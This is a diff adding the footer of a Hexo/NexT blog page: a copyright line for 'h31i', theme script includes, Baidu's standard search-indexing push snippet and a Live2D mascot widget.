+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">h31i</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+    <script defer src="//cdn.jsdelivr.net/gh/theme-next/theme-next-three@1/three-waves.min.js"></script>
+
+
+  
+  <script>
+    (function(){
+      var canonicalURL, curProtocol;
+      //Get the <link> tag
+      var x=document.getElementsByTagName("link");
+		//Find the last canonical URL
+		if(x.length > 0){
+			for (i=0;i<x.length;i++){
+				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
+					canonicalURL=x[i].href;
+				}
+			}
+		}
+    //Get protocol
+	    if (!canonicalURL){
+	    	curProtocol = window.location.protocol.split(':')[0];
+	    }
+	    else{
+	    	curProtocol = canonicalURL.split(':')[0];
+	    }
+      //Get current URL if the canonical URL does not exist
+	    if (!canonicalURL) canonicalURL = window.location.href;
+	    //Assign script content. Replace current URL with the canonical URL
+      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"display":{"position":"left","width":200,"height":400},"mobile":{"show":true},"log":false});</script></body>
+</html>
